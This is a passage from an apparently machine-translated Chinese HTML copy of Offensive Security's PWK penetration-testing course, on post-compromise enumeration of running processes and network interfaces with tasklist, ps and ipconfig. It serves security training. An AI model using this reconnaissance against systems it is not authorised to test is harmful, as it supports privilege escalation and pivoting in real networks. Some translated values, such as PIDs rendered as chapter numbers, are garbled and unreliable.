<div style="position:absolute;top:88992;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">944 Appinfo、BITS、DsmSvc、gpsvc、IKEEXT、</font></font></nobr></div>
<div style="position:absolute;top:89009;left:392"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iphlpsvc、LanmanServer、lfsvc、ProfSvc、</font></font></nobr></div>
<div style="position:absolute;top:89026;left:392"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">计划、SENS、SessionEnv、</font></font></nobr></div>
<div style="position:absolute;top:89043;left:392"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ShellHWDetection、主题、TokenBroker、</font></font></nobr></div>
<div style="position:absolute;top:89060;left:392"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户管理器、winmgmt、WpnService</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:89127;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">449 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（大卫·麦肯齐，2003 年），https://linux.die.net/man/1/uname</font></font></font></nobr></div>
<div style="position:absolute;top:89147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">450 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:89275;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="76"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 76 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:89308;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:90385;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:90385;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:90385;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">517</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:89404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虚拟主机程序    </font></font></nobr></div>
<div style="position:absolute;top:89404;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">952 定期服务</font></font></nobr></div>
<div style="position:absolute;top:89420;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虚拟主机程序    </font></font></nobr></div>
<div style="position:absolute;top:89420;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">960 BFE、CoreMessagingRegistrar、DPS、MpsSvc</font></font></nobr></div>
<div style="position:absolute;top:89437;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虚拟主机程序    </font></font></nobr></div>
<div style="position:absolute;top:89437;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第988话</font></font></nobr></div>
<div style="position:absolute;top:89454;left:392"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WinHttpAutoProxySvc、wscsvc</font></font></nobr></div>
<div style="position:absolute;top:89472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:89488;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mysqld.exe    </font></font></b></nobr></div>
<div style="position:absolute;top:89488;left:352"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第1816章</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:89505;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:89525;left:185"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 522 - 获取操作系统上正在运行的进程和匹配服务的列表</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:89554;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出显示</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务正在机器上运行，这可能是您感兴趣的</font></font></nobr></div>
<div style="position:absolute;top:89573;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在合适的条件下。</font></font></nobr></div>
<div style="position:absolute;top:89606;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请记住，此输出不会列出特权用户运行的进程。</font><font style="vertical-align: inherit;">在基于 Windows 的</font></font></nobr></div>
<div style="position:absolute;top:89626;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统，我们需要高权限来收集这些信息，这使得过程更加</font></font></nobr></div>
<div style="position:absolute;top:89645;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">难的。</font></font></nobr></div>
<div style="position:absolute;top:89678;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Linux 上，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ps</font></font></font></b><font style="vertical-align: inherit;"><font style="font-size:8px"><font style="vertical-align: inherit;"> 451</font></font><font style="vertical-align: inherit;">列出系统进程（包括由特权用户运行的进程）</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"></font></font></nobr></div>
<div style="position:absolute;top:89697;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font><font style="vertical-align: inherit;">我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">a</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志列出所有带有或不带有</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tty </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">452 的</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程</font><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">u</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志</font></font></nobr></div>
<div style="position:absolute;top:89717;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以用户可读的格式列出进程。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:89751;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ps axu</font></font></font></b></nobr></div>
<div style="position:absolute;top:89769;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户 PID %CPU %MEM VSZ RSS STAT 开始时间命令</font></font></nobr></div>
<div style="position:absolute;top:89785;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根    </font></font></nobr></div>
<div style="position:absolute;top:89785;left:214"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 0.0 0.6 28032 6256 Ss Nov07 0:03 /sbin/init</font></font></nobr></div>
<div style="position:absolute;top:89802;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根    </font></font></nobr></div>
<div style="position:absolute;top:89802;left:214"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2 0.0 0.0 0 0 S Nov07 0:00 [kthreadd]</font></font></nobr></div>
<div style="position:absolute;top:89819;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根 254 0.0 0.9 54536 9924 Ssl Nov07 1:45 /usr/bin/vmtoolsd</font></font></nobr></div>
<div style="position:absolute;top:89836;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根 255 0.0 0.0 0 0 S Nov07 0:00 [kauditd]</font></font></nobr></div>
<div style="position:absolute;top:89853;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根 259 0.0 0.4 25956 5100 Ss Nov07 0:01 /lib/systemd/systemd-journald</font></font></nobr></div>
<div style="position:absolute;top:89870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根 294 0.0 0.4 17096 4996 Ss Nov07 0:00 /lib/systemd/systemd-udevd</font></font></nobr></div>
<div style="position:absolute;top:89887;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">systemd+ 309 0.0 0.3 16884 3940 Ssl Nov07 0:07 /lib/systemd/systemd-timesyncd</font></font></nobr></div>
<div style="position:absolute;top:89904;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根 359 0.0 0.0 0 0 S&lt; Nov07 0:00 [ttm_swap]</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:89921;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根 514 0.0 1.5 53964 16272 Ss Nov07 0:00 /usr/bin/VGAuthService</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:89938;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根 515 0.0 0.2 5256 2816 Ss Nov07 0:00 /usr/sbin/cron -f</font></font></nobr></div>
<div style="position:absolute;top:89955;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">消息+ 518 0.0 0.3 6368 3896 Ss Nov07 0:37 /usr/bin/dbus-daemon --system.</font></font></nobr></div>
<div style="position:absolute;top:89972;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rtkit 523 0.0 0.3 24096 3156 SNsl Nov07 0:00 /usr/lib/rtkit/rtkit-daemon</font></font></nobr></div>
<div style="position:absolute;top:89989;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:90006;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">学生 8868 0.0 0.3 7664 3336 pts/0 R+ 14:25 0:00 ps axu</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:90025;left:298"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 523 - 获取 Linux 上正在运行的进程列表</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:90055;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出列出了几个以 root 身份运行的进程，这些进程可能值得研究</font></font></nobr></div>
<div style="position:absolute;top:90074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞。</font><font style="vertical-align: inherit;">请注意，我们的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ps</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令也列在输出中。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:90108;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.1.1.5 枚举网络信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:90143;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们分析目标主机的下一步是查看可用的网络接口、路由和</font></font></nobr></div>
<div style="position:absolute;top:90163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开放端口。</font></font></nobr></div>
<div style="position:absolute;top:90195;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此信息可以帮助我们确定受感染目标是否连接到多个</font></font></nobr></div>
<div style="position:absolute;top:90215;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络，因此可以用作枢纽。</font><font style="vertical-align: inherit;">此外，特定虚拟机的存在</font></font></nobr></div>
<div style="position:absolute;top:90234;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接口可以指示虚拟化或防病毒软件的存在。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:90315;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">451 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Linux 手册页项目，2018 年），http://man7.org/linux/man-pages/man1/ps.1.html</font></font></font></nobr></div>
<div style="position:absolute;top:90335;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">452 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Linus Åkesson，2018 年），https://www.linusakesson.net/programming/tty/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:90463;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="77"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 77 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:90496;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:91573;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:91573;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:91573;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">518</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:90608;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击者可能会使用受感染的目标在已连接的目标之间移动或移动</font></font></i></nobr></div>
<div style="position:absolute;top:90627;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络。</font><font style="vertical-align: inherit;">这将放大网络可见性并允许攻击者瞄准</font></font></i></nobr></div>
<div style="position:absolute;top:90646;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机无法从原始攻击机直接可见。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:90708;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还可以调查端口绑定以查看正在运行的服务是否仅在环回上可用</font></font></nobr></div>
<div style="position:absolute;top:90728;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地址，而不是可路由的地址。</font><font style="vertical-align: inherit;">调查正在侦听的特权程序或服务</font></font></nobr></div>
<div style="position:absolute;top:90747;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">环回接口可以扩大我们的攻击面并增加我们获得特权的可能性</font></font></nobr></div>
<div style="position:absolute;top:90766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">升级攻击。</font></font></nobr></div>
<div style="position:absolute;top:90799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以开始我们的信息收集在Windows操作系统上使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IPCONFIG</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">453</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font></nobr></div>
<div style="position:absolute;top:90819;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/所有</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志来显示所有适配器的完整的TCP / IP配置。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:90853;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\用户\学生&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ipconfig /all</font></font></font></b></nobr></div>
<div style="position:absolute;top:90887;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows IP 配置</font></font></nobr></div>
<div style="position:absolute;top:90921;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机名 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">：客户端251</font></font></nobr></div>
<div style="position:absolute;top:90938;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主 Dns 后缀。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: corp.com</font></font></nobr></div>
<div style="position:absolute;top:90955;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">节点类型。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">： 杂交种</font></font></nobr></div>
<div style="position:absolute;top:90972;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IP 路由已启用。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">： 不</font></font></nobr></div>
<div style="position:absolute;top:90989;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WINS 代理已启用。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">： 不</font></font></nobr></div>
<div style="position:absolute;top:91006;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DNS 后缀搜索列表。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: corp.com</font></font></nobr></div>
<div style="position:absolute;top:91040;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以太网适配器 Ethernet0:</font></font></nobr></div>
<div style="position:absolute;top:91074;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特定于连接的 DNS 后缀。</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
<div style="position:absolute;top:91091;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: Intel(R) 82574L 千兆网络连接</font></font></nobr></div>
<div style="position:absolute;top:91108;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实际地址。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 00-0C-29-C1-ED-B0</font></font></nobr></div>
<div style="position:absolute;top:91125;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DHCP 启用。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">： 不</font></font></nobr></div>
<div style="position:absolute;top:91142;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动配置已启用。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">： 是的</font></font></nobr></div>
<div style="position:absolute;top:91159;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">链路本地 IPv6 地址。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: fe80::bc64:ab2f:a10f:edc9%15(首选)</font></font></nobr></div>
<div style="position:absolute;top:91176;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IPv4 地址。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">：</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.22</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（首选）</font></font></nobr></div>
<div style="position:absolute;top:91193;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子网掩码 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 255.255.255.0</font></font></nobr></div>
<div style="position:absolute;top:91210;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认网关 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">：</font></font></nobr></div>
<div style="position:absolute;top:91227;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DHCPv6 IAID。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 83889193</font></font></nobr></div>
<div style="position:absolute;top:91244;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DHCPv6 客户端 DUID。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 00-01-00-01-25-55-82-FF-00-0C-29-C1-ED-B0</font></font></nobr></div>
<div style="position:absolute;top:91261;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DNS 服务器。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 10.11.0.2</font></font></nobr></div>
<div style="position:absolute;top:91278;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于 Tcpip 的 NetBIOS。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 启用</font></font></nobr></div>
<div style="position:absolute;top:91312;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以太网适配器 Ethernet1：</font></font></nobr></div>
<div style="position:absolute;top:91346;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特定于连接的 DNS 后缀。</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
<div style="position:absolute;top:91363;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">：英特尔(R) 82574L 千兆网络连接#2</font></font></nobr></div>
<div style="position:absolute;top:91380;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实际地址。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 00-0C-29-C1-ED-BA</font></font></nobr></div>
<div style="position:absolute;top:91396;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DHCP 启用。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">： 不</font></font></nobr></div>
<div style="position:absolute;top:91413;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动配置已启用。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">： 是的</font></font></nobr></div>
<div style="position:absolute;top:91430;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">链路本地 IPv6 地址。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: fe80::9d3e:158a:241b:beb7%4(首选)</font></font></nobr></div>
